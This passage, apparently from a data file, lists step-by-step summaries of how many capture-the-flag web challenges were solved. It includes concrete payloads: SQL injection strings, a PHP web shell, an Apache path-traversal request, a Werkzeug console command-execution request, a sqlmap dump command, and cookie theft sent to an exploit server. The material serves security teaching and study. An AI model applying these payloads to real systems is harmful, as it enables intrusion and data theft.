    "Use 'cat cmd.php' command to view the code, which reveals the blacklist filter.",
    "Examine the blacklist filter code to discern it replaces certain blacklisted characters and commands.",
    "Identify the use of base64-encoded payloads as a potential workaround this blacklist.",
    "Create a base64-encoded payload to bypass the blacklist, using a payload that reads the desired file.",
    "Construct a command that runs the base64-encoded payload through decoding on the server, understood by the server as a Python command.",
    "Print the constructed command to confirm correct formatting and content.",
    "Identify a web application vulnerability, specifically XS Leaks, from incoming responses at the '/checkbalance' endpoint.",
    "Notice that users are redirected if the queried amount exceeds their actual balance.",
    "Determine that window's history length can reveal whether a redirection occurred, thus allowing to approximate the user's balance.",
    "To adhere to Same Origin Policy, open a new window from the exploit server with the URL 'http://10.8.201.87:5000/checkbalance?amount=${num}'.",
    "Wait for the site to load. Depending on the balance, the window may be redirected to '/'.",
    "Change the window's location back to the exploit server for similarity of origins.",
    "Check the window's 'history.length' attribute to determine if a redirect occurred.",
    "Use trial and error to narrow down the appropriate number by controlling the number of intervals in the aforementioned steps.",
    "Build a HTML page to automated this process, using a JavaScript script that opens a window, checks redirection, and then guesses a number based on the window's history length.",
    "Use the 'tryNumber' function to navigate to the '/checkbalance' endpoint with a queried amount.",
    "Register a delay for the time it takes for the page to load and possibly redirect.",
    "Change the location of the pop-up back to the exploit server.",
    "Check the length of the window's history to determine if a redirection has occurred.",
    "If the history length is three, the balance has been exceeded. In that case, return false and the queried amount.",
    "Otherwise, return that the balance is exceeded and the queried amount.",
    "Start the checker for a number range.",
    "Post each successful guess to the exploit server.",
    "Understood that there is a blacklist filter for '#' and '=' symbols",
    "Discovered that by using 'test' or 1-- - possible account credentials can be obtained but they don't provide the flag",
    "Scheduled to do a UNION based injection to dump the database to get the flag",
    "Implemented the UNION based SQL Injection using 'username=test' or 1 UNION SELECT *, null from flag-- -&password=test' or 1 UNION SELECT *, null from flag-- -'",
    "Received a collection of CSV files containing network traffic data and a shapefile with information about cameras in Singapore",
    "Instructed to locate the origin point of most attacks and calculate the number of cameras within 1.3km radius of that point",
    "Wrote a Python script to extract out the most commonly occurring source IP (src_ip) from the CSV files",
    "Discovered the latitude and longitude of the most frequently occurring src_ip",
    "Parsed the shapefile using geopandas",
    "Implemented haversine formula to calculate the great-circle distance between locations based on their latitudes and longitudes",
    "Established the coordinates of the point of interest for distance calculations",
    "Counted the number of cameras within a 1.3km radius of the point of interest by looping through each camera location in the shapefile and checking if it's within the specified distance using the haversine formula",
    "Received a Markdown Editor web application to host notes for a challenge with an admin bot that visits URL submissions",
    "Wanting to create an XSS payload, started by analysing how the web application processes Markdown",
    "Found that the preview feature on the right side is an iframe of /demo",
    "Found that the Preview button posts a message to the iframe, ensuring that the message is only sent to the intended receiver",
    "Found that the iframe's message is received and processed in /demo, with data POST-ed to the /api/filter endpoint and sanitized HTML added to document.body.innerHTML",
    "Noticed that the iframe also posts the response from the /api/filter endpoint to window.parent, meaning any site can create an iframe of the web application and receive the message",
    "Found that the user's cookies are sent along with the POST request, and if /api/filter endpoint returns sensitive, user-specific data based on these cookies, this information could be read",
    "Realised that the server code for /api/filter endpoint does indeed return the hash of the user's token in the response",
    "Created a payload that loads /demo in an iframe, posts a message to trigger the /api/filter POST request in the admin's context, then catches and sends the response, containing the admin's hash, to an exploit server",
    "Received the admin's hash on the exploit server, but realized that this is not enough to access the flag - admin's token access is required, which needs a CSRF to /api/flag, necessitating an XSS on the challenge server",
    "Noted that when the admin's hash is used, the /api/create handler does not sanitize data. Hence, XSS payload is generated by sending a POST request to /api/create",
    "Created a CSRF payload that fetches /api/flag and makes a callback to the exploit server with the page contents. Utilized fromCharCode() to avoid escaping single and double quotes",
    "Finally, received the /api/flag contents, URL-decoded the output, and obtained the flag",
    "Identify the website's vulnerability to XSS.",
    "Examine the init() function of the website, which changes the displayed note's innerHTML to the /get response on load.",
    "Discover the user can add notes via a POST request to /add.",
    "Examine the /get and /add endpoints and their relationship with user's ID cookie in the Notes map.",
    "Recognize the XSS prevention methods implemented by the site - cookies are set to prevent XSS for all API endpoints.",
    "Realize that although XSS can be performed, it would only affect the currently logged in user and not the admin.",
    "Examine the /find endpoint which takes the condition, startsWith , endsWith, and debug parameters.",
    "Discover that the /find endpoint can be used for Response Header Injection.",
    "Use the /find endpoint to inject a Set-Cookie header to set the admin's ID cookie to your own session.",
    "Preserve the original admin's ID by setting the Path of the custom cookie to /get which allows to use the original admin ID in the /find endpoint.",
    "Create a XSS payload that fits within the 75 character limit to be stored. In this case, JavaScript code using `document.cookie` to control variables.",
    "Use the /find endpoint to encode the cookie-characters as response headers.",
    "Create a Python script to generate URLs that set cookies with parts of manipulated JavaScript code.",
    "Modify the output of the Python code to look like a JavaScript script to be executed.",
    "In this script, manipulate the multiple URL opens to actual browser window opens.",
    "Set malicious cookies by having the user (admin) visit these URLs.",
    "Redirect the user to the main site.",
    "The malicious JavaScript code is executed on client's side, which fetches an exploitative script and runs it in the background.",
    "Perform a CSRF to the /find endpoint to retrieve the flag and make a callback to our server with the data.",
    "Extract the flag from the response received on the callback URL.",
    "Identified a URL for the server to request, leveraging a Local File Inclusion (LFI) vulnerability for Server Side Request Forgery (SSRF) and viewing files using the 'file://' protocol",
    "Verified the server code location from the provided Dockerfile as '/code/app.py'",
    "Used a POST request to request 'file:///code/app.py' and review the server code",
    "Recognized that a Redis database was being utilized with the hostname as 'redis' and port 6379",
    "Understood that for a POST request, a 'Requests_On_Steroids' function is used to fetch the URL and if the value of <userID>_isAdmin key in Redis database is 'yes', the flag was shown in the response",
    "Identified the need to overwrite the <userID>_isAdmin value and the possibility to leverage the SSRF vulnerability to communicate with the Redis instance",
    "Observed that 'Requests_On_Steroids' function in 'main.py' supported Gopher protocol to communicate with any TCP server",
    "Discovered that instead of 'gopher://' protocol, 'inctf://' had to be used",
    "Identified the 'GopherAdapter' code in 'modules/Gophers.py'",
    "Found that the Gopher adapter used was modified from a GitHub gist to remove '/_' in the URL's path",
    "Realized the inability to send multi-line input using RESP protocol as 'urllib.parse' was updated to strip newline characters",
    "Used inline commands of Redis to send commands directly with the payload 'url=inctf://redis:6379/_SET <userID>_isAdmin \"yes\"'",
    "Sent the command 'SET <userID>_isAdmin \"yes\"' to set the <userID>_isAdmin value to 'yes'",
    "Received the flag 'inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}'",
    "Identify /post.php has a Local File Inclusion vulnerability.",
    "Confirm the vulnerability by requesting /post.php?post=../../../../../../etc/passwd.",
    "Decide on achieving remote code execution but realize it requires ability to write to a file on the server.",
    "Discover that PHP sessions are file-based and predictably stored at /tmp/sess_<PHPSESSID>.",
    "Identify that /set.php allows setting the 'theme' value in the session to any string using the 'theme' GET query parameter.",
    "Realize the session file can be accessed through the LFI vulnerability, and the set input is reflected in the included PHP code.",
    "Set the theme to '<?php phpinfo() ?>', to confirm the vulnerability and the input reflection.",
    "Find a PHP payload that will provide a web shell and set the theme to it '/set.php?theme=<?php system($_GET['c']) ?>'.",
    "Use the created web shell to explore the file system and find the flag MetaCTF{wh4t??lfi_1s_ev0lv1ng??}.",
    "Given login credentials for an online portal with MFA and Captcha code protection.",
    "Notice a 'login_session_token' is received upon login attempt.",
    "Identify that the 'login_session_token' is used when making a query to 'mfa_service.php'.",
    "Discover that there is no limit to the number of attempts made with the same token, as long as correct CAPTCHA code is provided.",
    "Perform batching in GraphQL to send multiple queries at once, with the anticipation that the server will process all queries together using the same CAPTCHA code.",
    "Successfully use the same CAPTCHA code to test two different MFA tokens by sending them both in the same HTTP request.",
    "Understand that MFA token is only 4 digits and take advantage of this limited search space by sending batches of thousands of queries together, thereby reducing the number of required CAPTCHA responses.",
    "Observe that due to request length limits around 3000 queries are batched at a time.",
    "Write script to automate this process of generating payloads and making POST requests.",
    "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
    "Found a successful login attempt among the batched requests.",
    "Obtained the flag `MetaCTF{if_brute_force_doesnt_work_use_more_brute_forceeeeeeee}`.",
    "Analyzed initial JavaScript code for vulnerabilities",
    "Identified a line of code where user input is passed unfiltered directly to SQL query",
    "Recognized the platform as SQLite database",
    "Injected a UNION query to retrieve table names",
    "Confirmed the existence of an additional table holding the flag",
    "Ran a final UNION query against the identified table for flag extraction",
    "Retrieved the flag",
    "Started with network scan using Nmap",
    "Identified that the Apache server version 2.4.49 is operating on port 12380",
    "Determined that this version of Apache had a known vulnerability",
    "Checked the related details on a popular vulnerability database, https://www.exploit-db.com/exploits/50383",
    "Leveraged the above-mentioned Remote Code Execution (RCE) vulnerability aiming to gain access to the system",
    "Composed a malicious HTTP GET request to exploit the vulnerability",
    "Provided a series of directory traversal characters in the request (/%2e%2e/%2e%2e) aimed at accessing server roots",
    "Used the above to execute commands to retrieve the contents of the flagged file located at /secret/safe/flag.png",
    "Converted the file content to base64 to ensure that the PNG file content is transferred without any encoding issues",
    "Identified Apache Traffic Server (ATS) 7.1.1 in the 'Server' response header",
    "Identified that ATS 7.1.1 is vulnerable to CVE-2018-8004, a request smuggling vulnerability due to a lack of validation for 'Content-Length' headers",
    "Identified that the server uses 'Content-Length' header even if 'Transfer-Encoding' header exists, leading to a request smuggling vulnerability",
    "Observed that a request to '/save.php' appends an entry to a log file containing the cookies and value of 'X-Access' header",
    "Assumed an admin visit to the site and constructed a CL-TE request smuggling attack to direct the admin to '/save.php'",
    "Crafted a payload using 'GET / HTTP/1.1' and the 'Content-Length' and 'Transfer-Encoding' headers",
    "Realized that the ATS server forwards the entire payload as a single request to the Nginx backend, while Nginx sees the 'Transfer-Encoding' header and considers the first request ended",
    "Noted that the second request 'GET /save.php HTTP/1.1' is not yet completed after the end of the first request",
    "Identified that when the admin visits the site (a third request), his request is appended to the incomplete second request, being processed as one single request",
    "Recognized that this single request contains the admin's 'Cookie' and 'X-Access' headers",
    "Viewed the admin's cookie and 'X-Access' headers in the log file",
    "Used these cookies to visit 'private.php' and obtain the flag.",
    "Registration process was completed in the system",
    "Redirection to `/users/<username>/files` is observed after registration where file upload capability is noticed",
    "Attempted user enumeration by utilizing two accounts",
    "Established the ability to enumerate usernames at `/users/<username>`, a success results in a 403 redirect to own account, failure results in 404 Not Found",
    "Performed username enumeration utilizing the `dirb` wordlist",
    "Discovered valid usernames including `admin`, `root`, `builder`, `employee`, and `staff`",
    "Observed that server side validation checks for valid user but not legitimate ownership for file retrieval at `/users/<username>/files/<filename>`",
    "Identified an Insecure Direct Object Reference (IDOR) vulnerability due to the absence of ownership verification during file requests",
    "Scanned each discovered username for potential files associated with them",
    "Located the flag at `/users/employee/files/fileadmin`",
    "Logged into the application",
    "Viewed the page source to analyze the data being displayed",
    "Identified a 'role' attribute that could possibly be changed to escalate privileges",
    "Examined the registration fields to understand what data is being submitted during the registration process",
    "Identified that an 'account' object with 'username' and 'password' attributes is submitted during registration",
    "Submitted the registration form with 'account[role] = admin' to change the role and escalate privileges",
    "Gained access to '/admin' after the role was successfully changed to 'admin'",
    "Identify the application listening on port 11111 as a web application",
    "Assess the web application and find a login function",
    "Identify the input fields for the login function, which are 'username' and 'password'",
    "Assume that these input fields are not properly sanitizing special characters and attempt SQL injection",
    "Input the SQL injection payload in the 'username' and 'password' fields as `username=admin&password=' or '1`",
    "Execute the payload and successfully bypass the login function due to successful SQL injection",
    "Identified the challenge to be located at port 8080 with a web interface",
    "Recognized the challenge to be related to cookie manipulation",
    "Noticed the cookies being set at every stage of authentication",
    "Recognized the necessity to set certain cookies to gain access to '/admin'",
    "Injected cookie named 'username' with value 'admin'",
    "Injected another cookie named 'visited-main-page' with value 'true'",
    "Injected a further cookie named 'made-an-account' with value 'true'",
    "Injected another cookie named 'authenticated-user' with value 'true'",
    "Injected final cookie named 'admin' with value 'true'",
    "Accessed '/admin' using the manipulated cookies",
    "Analyzed the provided PHP source code to identify vulnerabilities",
    "Noted that most common PHP file extensions are blocked except .htaccess",
    "Created a .htaccess file to tell Apache to interpret .php16 as a PHP file",
    "Uploaded the .htaccess file",
    "Created and uploaded a .php16 file for remote code execution",
    "Used the remote code execution to download the flag",
    "Identified the challenge as a Server Side Request Forgery (SSRF) issue, with the vulnerable parameter being 'galleryUrl'",
    "Decided to exploit the SSRF vulnerability by making an internal request to the '/admin' path",
    "Crafted the malicious query '/gallery?galleryUrl=http://localhost:20011/admin' to access the admin console via internal request",
    "Analyze the source codes provided.",
    "Understand the requirements to pass the login authentication that includes correct username, password, and a Multi-factor Authentication (MFA) token.",
    "Identify the hardcoded username.",
    "Confirm the password from a known resource.",
    "Identify PHP object injection vulnerability through unserialize() function.",
    "Realize that initialization of the 'mfa' attribute as a reference to the '_correctValue' attribute allows to bypass the MFA check.",
    "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical.",
    "Serialize the created object and encode it in base64 format.",
    "Reconstruct the user data from the encoded string.",
    "Verify the user data.",
    "Pivoted from the previously found IP address and scanned it, finding a HTTP service.",
    "Identified the service as the app mentioned in the challenge.",
    "While testing the app, discovered that it uses curl for certain inputs.",
    "Determined that the app checks the IP address in the URL against a whitelist of allowed IP ranges: 10.0.0.0/24, 10.0.42.0/24, and 10.0.43/24.",
    "Conducted a Burp intruder scan on 10.35.2.134/call_api.php to identify potentially connectable hosts.",
    "Scanned the 10.0.42.0/24 network and discovered valid endpoints at 10.0.42.2 and 10.0.42.200.",
    "Identify the GET form with 'search' parameter in 10.0.42.200.",
    "Test basic payloads and identify SQL injection is possible but spaces aren't allowed.",
    "Attempt SQL injection using MySQL comments in place of spaces.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='1' and '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='2'.",
    "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
    "Run SQLMap command 'sqlmap http://127.0.0.1/test.php?search=abc -p search --tamper=space2comment --technique=B --risk 3 --dump --threads 10 -D db -T internal_api_infos' to inject and dump database data.",
    "Use the dumped admin credentials to login to the first webpage.",
    "Use the remaining dumped credentials to login to the Admin page and access the flag.",
    "Checked the cookies to find a value for 'confidential_documents', indicating another potential API call",
    "Understood that the API is powered by Werkzeug, which includes a debugging console at '/console' when debugging is enabled",
    "Made the inference that if debugging is enabled, it would likely be on the development server rather than the production server",
    "Visited the URL `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole` to find a Werkzeug console",
    "Found the secret key for the debugger hardcoded in the JavaScript",
    "Crafted a request `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole?__debugger__=yes&cmd=__import__('os').listdir('/')%3b&frm=0&s=IUrsy36AKlZ2zvT1vaPc` to initiate Remote Code Execution (RCE)",
    "Found `flag.txt` in the root directory",
    "Sent another request to read the content of the `flag.txt` file",
    "Identified the problem requires generating two PDFs with the same MD5 hash, but different content.",
    "Chose two small-sized PDFs due to size restrictions.",
    "Used Python scripting and the 'mutool' command to manipulate the PDF files.",
    "Created 'first.pdf' and 'second.pdf' using the chosen input PDFs.",
    "Created 'merged.pdf' containing a dummy PDF and the chosen input PDFs.",
    "Read and stored the content of the merged and initial PDF files in separate variables.",
    "Extracted the count of PDF pages from each PDF file.",
    "Identified the list of references to the PDF pages in the merged PDF file.",
    "Excluded the reference to the dummy page and created separate PDF page lists for both input PDFs.",
    "Defined a template for the final PDF files which will hold identical initial content and MD5 hashes, but will diverge at a certain point to become two different PDFs.",
    "Used the page count and PDFs list to write a manipulated 'hacked.pdf' file.",
    "Adjusted the offsets in the PDF with the 'mutool clean' command to correct any discrepancies.",
    "Replaced a specific string in the cleaned PDF data to ensure compatibility with different versions of 'mutool'.",
    "Read the 'pdf1.bin' and 'pdf2.bin' files which contain the prefix of the PDF content, which will be the same for both PDFs to ensure the same MD5 hash.",
    "Created the new PDF files 'collision1.pdf' and 'collision2.pdf' with the predetermined prefix and the cleaned, manipulated PDF data.",
    "Checked the MD5 hashes of both the PDFs using the hashlib library to confirm they are the same.",
    "Removed intermediate files created during the process.",
    "Verified the final PDFs using the 'mutool info -X' command.",
    "Uploaded the two colliding PDFs to the challenge page to unlock the flag and source code.",
    "Investigate the source code provided to understand how the application works and what you need to exploit. Find that the '/display' page checks the session cookie which has a `very_auth` session variable which needs to be set to `admin`.",
    "Discover that the Flask session secret key is hardcoded into the source code, selected randomly from an array of cookie names.",
    "Decode the Flask session cookie by extracting the text before the period (.), adding padding, and applying Base64 decoding.",
    "Notice that the remainder of the session cookie is a signature that will be checked server-side to prevent tampering.",
    "Realize that the secret key needs to be cracked. To do this, write a script that bruteforces each of the hardcoded cookie names to find the one that matches the signature.",
    "After running the script, find the secret key is 'butter'.",
    "With the secret key, craft a new session cookie with the `very_auth` variable set to 'admin'. Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python to achieve this.",
    "After encoding the session, obtain a new session cookie as output.",
    "Place this newly crafted cookie back into the application using Burpsuite and observe that you now get the flag in the response.",
    "Accessed the Startup Company web page",
    "Identified a potential SQL injection point in the 'moneys=' parameter",
    "Estimated the SQL query structure in the website's backend, taking into consideration the potential manipulation of the 'moneys=' parameter",
    "Confirmed SQLite injection was possible by manipulating the 'moneys=' parameter and seeing the results in the green text",
    "Confirmed the use of SQLite version 3.22.0",
    "Retrieved table names from the database by manipulating the SQL query using 'moneys=' parameter",
    "Used GROUP_CONCAT function to concatenate all retrieved table names into a single string",
    "Retrieved column names of 'startup_users' table from the database using the SQL query",
    "Used GROUP_CONCAT function to concatenate all retrieved column names into a single string",
    "Dumped data from 'startup_users' table by using the SQL query and concatenating usernames using the GROUP_CONCAT function",
    "Identified 'the_real_flag' user and suspected the flag to be in the 'wordpass' value",
    "Retrieved the flag by dumping data from 'startup_users' table again, this time concatenating 'wordpass' values using the GROUP_CONCAT function",
    "Access the provided URL",
    "Download and review the robots.txt file",
    "Attempt to navigate to /admin.phps, gets a 'Not Found' error",
    "Instead, navigate to /index.phps to reveal source code for index.php",
    "Find a reference to another page, authentication.php, in the index.php code",
    "View the source code of authentication.php by navigating to /authentication.phps",
    "Reveal a 'require_once()' function call, which includes the cookie.php file",
    "View the source code of cookie.php",
    "Identify a potential PHP deserialization vulnerability in cookie.php, where $_COOKIE['login'] is deserialized",
    "Find the 'access_log' class in authentication.php, which has a '__toString()' function that can return the contents of a file",
    "Understand that crafting and serializing a custom 'access_log' object with the log_file set to '../flag' can potentially retrieve the flag due to the deserialization of the 'login' cookie",
    "Construct a custom PHP script to create and serialize an 'access_log' object with the log_file set to '../flag', then encode this serialized object with base64",
    "Decide to add the base64-encoded serialized object as a 'login' cookie in the browser, and navigate to /authentication.php, as that's where the needed 'access_log' class is defined",
    "Understand that the added cookie will be deserialized into an 'access_log' object and assigned to the $perm variable upon a request to 'authentication.php', which will inevitably fail and trigger the catch block where the flag is inadvertently printed due to the '__toString()' method of the 'access_log' class",
    "Observe that the flag is revealed on the browser",
    "Accessed the website provided in the challenge",
    "Checked the filter page for clues or information",
    "Noticed the feature using SQLite through filters and SQL statements",
    "Created exploit using SQL injection: 'adm' || trim('in', ` Password: `) || ''",
    "Discovered that `||` is the SQLite concatenation operator and is used to join strings together",
    "Understood that trim(string, character) will remove `character` from `string`. Therefore, ' AND password=' is treated as a string and hence, ignored",
    "Executed SQL statement: SELECT username, password FROM users WHERE username='adm' || trim('in',' AND password=') || ''",
    "Recognized that this SQL statement is equivalent to SELECT username, password FROM users WHERE username='adm' || 'in' || ''",
    "Realized finally that both SQL statements are identical to 'SELECT username, password FROM users WHERE username='admin''",
    "Logged in as admin using the discovered SQL injection",
    "Checked the filter page again to see any changes",
    "Attempted the third web Gauntlet where the length requirement is reduced",
    "Tried the previously discovered SQL injection, found that it still works",
    "Visited the URL provided in the problem statement.",
    "Identified that the web application might have an XPath injection vulnerability.",
    "Started testing for potential XPath injection points in the application.",
    "Used automated tools or manual testing to check for error messages indicative of XPath Injection.",
    "If identified, manipulated the XPath query to bypass authentication mechanisms of the application.",
    "Once successful, noted the steps taken to reproduce the attack.",
    "Reported the findings on the platform provided for the CTF Challenge.",
    "Analyzed the source code which indicates that for testing locally, `admin:admin` is the basic authentication credentials",
    "Identified an interesting functionality of the app that modifies the `services` object when POST-ing JSON to the `/change_status` endpoint using the `fast-json-patch`",
    "Researched and identified that a prototype pollution vulnerability exists in `applyPatch()`",
    "Realized that by POST-ing certain data (including `constructor/prototype/offline`), every object will now have the `offline` attribute",
    "Identified potential for serious exploits like RCE due to the presence of prototype injection vulnerability in server-side code",
    "Explored the potential of achieving RCE through exploiting the `ejs` module, by leveraging the `constructor/prototype/outputFunctionName`",
    "Identified that `ejs` is used as a library for templating in web applications",
    "Tested locally for potential RCE by POST-ing data that includes `constructor/prototype/outputFunctionName`",
    "Checked the output reflected in the `style.css` file after executing `whoami >> src/static/style.css`",
    "Deployed the provided Docker image and examined the `readflag` binary",
    "Attempted to open a bind shell on port 4444 to enable running the `readflag` binary",
    "Attempted to connect to the real server",
    "Set up a `ngrok` TCP forwarder and modified the RCE to trigger a reverse shell",
    "Used the public endpoint given by `ngrok` to catch the reverse shell and retrieved the flag",
    "Parsed the challenge PHP source code, noted potential XXE vulnerability because of 'LIBXML_NOENT' flag in 'loadXML()' function",
    "Created an LFI payload with a form that contains an XML part that substitutes an entity 'myExternalEntity' with '/etc/passwd', hinting at XXE exploitation",
    "Sent the payload to the server and received a list of users as a response, confirming the XXE vulnerability",
    "Unable to find flag files, it was confirmed that remote code execution (RCE) was necessary",
    "Uploaded a PHP file to the server, then made a request to the file to run PHP code while XML parsing is performed",
    "Used 'php://filter/' to Base64 encode the output of the PHP 'phpinfo()' function and reflect the result into the 'user' tag of the HTML response",
    "Analyzed 'phpinfo()' output to see 'disable_functions' configuration and identified that functions for shell command execution were disabled",
    "Used a recent exploit to bypass 'disable_functions' on PHP 7.0-8.0 versions and gain shell remote code execution",
    "Wrote the final payload, uploaded it to the server, and used the same request to read the flag from the '/readflag' binary",
    "Modified the payload script by incorporating the PHP 'disable_functions' bypass exploit, and ran '/readflag' by passing it as an argument to the defined 'pwn' function",
    "Executed HTTP POST request to the target server with the final payload as part of form data and received the flag as part of HTML response, confirmed successful RCE exploited to get the flag",
    "Started with examining the Dockerfile provided",
    "Identified a misconfiguration in the `apache.conf` file",
    "Noticed that `<Directory />` is incorrectly set to refer to the filesystem directory and not the web root",
    "Recognized this configuration grants access to any file on the filesystem",
    "Checked server responses to identify Apache server version (2.4.49)",
    "Acknowledged this version is vulnerable to a recent path traversal zero-day",
    "Executed a GET request `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1` to exploit this vulnerability",
    "Retrieved the flag at `/flag.txt`",
    "Visited the provided site and encountered the text 'Hello Mars!'.",
    "Performed a directory busting scan using gobuster to discover potential directories or files.",
    "Discovered several directories including /app and /flag.txt, the latter of which was inaccessible.",
    "Visited /app and found a web proxy application.",
    "Observed that the web proxy application is 'Powered by PHP-Proxy' and followed the provided link to the PHP-Proxy GitHub repository.",
    "Upon searching for 'vulnerability' in the GitHub repository's Issues, found an unfixed issue revealing a Local File Inclusion (LFI) vulnerability in PHP-Proxy.",
    "Located an exploit script provided in the GitHub issue.",
    "Modified the exploit script to target the provided site and the located /flag.txt.",
    "Ran the modified exploit script and obtained the flag.",
    "Extended analysis of the vulnerability showed that the encryption function in PHP-Proxy was not secure, as it could be reverse-engineered to reveal the encryption key.",
    "With the obtained encryption key, it was possible to manipulate the file:// protocol to access otherwise forbidden files.",
    "View page source and found a commented information indicating possible internal IP and an endpoint for admins.",
    "Attempted to access the admin console ('/login.php') and received a 403 Forbidden response.",
    "Formed a hypothesis that the page might be checking the client's IP to decide if it's an admin.",
    "Decided to try sending a fake IP address in the headers using the 'X-Forwarded-For' field.",
    "Scanned the entire subnet from 172.16.2.0 to 172.16.2.255 using Burp Suite Intruder, with 'X-Forwarded-For' set to every IP in that range.",
    "Identified that 'X-Forwarded-For: 172.16.2.24' allows access to 'login.php'.",
    "Examined the login form on 'login.php' and noticed 'email' and 'pass' fields which are vulnerable to an SQL injection attack.",
    "Submitted an SQL injection in the 'email' and 'pass' parameters using a payload conforming to the INSERT query syntax.",
    "Successfully logged in as admin and found the flag.",
    "Inspect the provided source code.",
    "Identify the logic behind the application's authentication.",
    "Identify the classes and methods involved in the authentication process.",
    "Discover the object injection vulnerability in the PHP application.",
    "Identify that the `login` cookie is deserialized into a `Login` object.",
    "Examine the `Login` object for exploitation.",
    "Identify that the `Login` object includes an MFA token and a `User` object.",
    "Examine the `User` object and identify that it instantiates a `SQL` object.",
    "Realize that the `SQL` class executes SQL queries and uses the results for authentication.",
    "Determine that the `SQL` class contains a `$query` attribute used to generate a prepared statement.",
    "Note how the authentication fails if the `bind_param()` call returns false.",
    "Identify how to exploit the object injection vulnerability: By injecting custom objects into user data, you can modify protected attributes and bypass authentication.",
    "Develop a plan for object injection: Bypass MFA token check by setting `$mfa_token` as a reference to the `$_correctValue` attribute, and bypass SQL by modifying the `$query`.",
    "Create a custom `User` and `Login` object to bypass the MFA token check.",
    "Identify that by simply modifying the `$query`, you can perform an SQL injection, and plan to modify it to bypass authentication.",
    "Write a code in PHP that creates these custom objects (`Login`, `User`, `SQL`). The custom `Login` object contains the custom `User` object and the `$_correctValue` reference. The custom `User` object contains a custom `SQL` with the custom `$query`.",
    "Serialize, encode, and then URL-encode the custom `Login` object.",
    "Set the `login` cookie to the output of the previous step.",
    "Log in to the application using the manipulated cookie to get the flag.",
    "Accessed the provided web page http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719",
    "Accessed the Favicon of the webpage and found some encoded payload",
    "Decoded the base64 encoded payload to find PHP script",
    "Interpreted the PHP script to find a new endpoint for POST requests",
    "Noted that incoming data was saved into HTML files",
    "Found that http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php lists all HTML files",
    "Noted that admin reads these HTML files",
    "Crafted an XSS payload to get the cookies of the admins",
    "Sent this XSS payload through the data endpoint",
    "Set up a server to catch the redirected request with admin cookies",
    "Accessed robots.txt to find interesting entries",
    "Authenticated as admin and explored login.php",
    "Set debug parameter to TRUE and noted SQL errors",
    "Noted filter size limitation",
    "Crafted an SQL injection payload bypassing the filter limit",
    "Used the SQL injection payload to retrieve the flag",
    "Found a PHP webpage with a login.php that gives a 403 Forbidden error.",
    "Investigated gallery.php and noticed pictures of devices with internal subnet addresses.",
    "Hypothesized that the login page might be filtering requests by the user's IP address.",
    "Changed 'X-Forwarded-For' header in a Burp Suite Intruder scan to the internal IP address identified from the gallery.php.",
    "Successfully gained access to the login page by setting the 'X-Forwarded-For' header to '192.168.3.16'.",
    "Identified a form with 'username' and 'password' fields on the login page.",
    "Discovered an SQL injection vulnerability by using ' in the username parameter.",
    "Bypassed authentication by using the payload 'username=test&password=test' or 1=1 LIMIT 1;#'.",
    "Accessed a users.php page after logging in as the admin which contains usernames and card numbers.",
    "Investigated users.php page for additional SQL injection endpoints.",
    "Verified that /users.php?id=1 returns the data for user ID 1.",
    "Discovered a second SQL injection endpoint after fuzzing the input.",
    "Encountered a blacklist filter that prevents certain malicious characters or words.",
    "Used SQLMap to identify injection vectors and dump the database.",
    "Observed a column 'R34L_F14G' in the 'users_data' database, but it is returning blank results.",
    "Realized that replacing 'card_num' with 'R34L_F14G' in the SQLMAP query fails the blacklist filter.",
    "Used sqlmap to retrieve the 'R34L_F14G' column data from the 'users_data' table in the 'login.php' page by exploiting the secondary SQL injection vector.",
    "Retrieved the flag 'S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}'",
    "Intercept the HTTP request to understand the form submission structure",
    "Modify the HTTP GET parameter to test for arbitrary code executions with print=echo+'';phpinfo()",
    "Observe the result and notice that it validates the possibility of arbitrary code execution",
    "Examine the source code of the page by enabling the 'debug' option",
    "Identify the 'eval()' vulnerability and understand the list of blocked keywords/functions in the source PHP code",
    "Identify that the variables $blocked, $special_block, and $$special_block are defined before the 'eval()' statement and hence can be referenced in the eval-ed code",
    "Understand the concept of $$ variable in PHP and how it is used in the code",
    "Try referencing the blocked function and restricted file in the HTTP GET parameter with ?print=echo+'';print(eval('return ${blocked}[4](${nc});'))",
    "See that this leads to eval function executing file_get_contents('../flag.txt')",
    "Realize that while eval executes the command, it does not display the output and thus use print to display the output",
    "Observe the retrieval of the flag",
    "Visited the challenge website and tried to understand how it works",
    "Identified an admin bot script that the challenge provided",
    "Used Chrome DevTools to examine how the note taking app functions",
    "Analyzed the notes app's JavaScript source code",
    "Discovered how the app uses local storage to save notes",
    "Learned that the search feature places the query into the URL's fragment identifier",
    "Saw that search results affect which image loads: 'y.png' if the query is found within a note, 'n.png' if it's not",
    "Understood that the admin bot visits any URL provided, first storing a flag as a note on the challenge server",
    "Realized it might be possible to force the admin bot to perform a search function on the server, checking if a given fragment identifier substring is part of the flag",
    "Considered using a cache probing attack to detect whether a search was successful based on whether 'y.png' or 'n.png' was cached",
    "Constructed a JavaScript payload to be run on the victim's browser that loads an iframe of the notes site with a search query and measures the time taken to fetch 'y.png'",
    "Automated a bruteforce attack with a Python script that loads a template including the query for each possible character",
    "Discovered that headless mode of Chrome doesn't perform cache partitioning, allowing the cache probing attack to succeed",
    "Found out the intended solution involves bypassing the cache partitioning by controlling a subdomain matching the site domain, as subdomains and port numbers are ignored in cache keys",
    "Identified that the website is GitHub Pages site and does not require proof of domain ownership, letting an attacker set up a GitHub Pages site with a subdomain that matches the site domain",
    "Created a new GitHub Pages site with a subdomain that matched the target domain",
    "Deployed the previously developed JavaScript payload to the new GitHub Pages site",
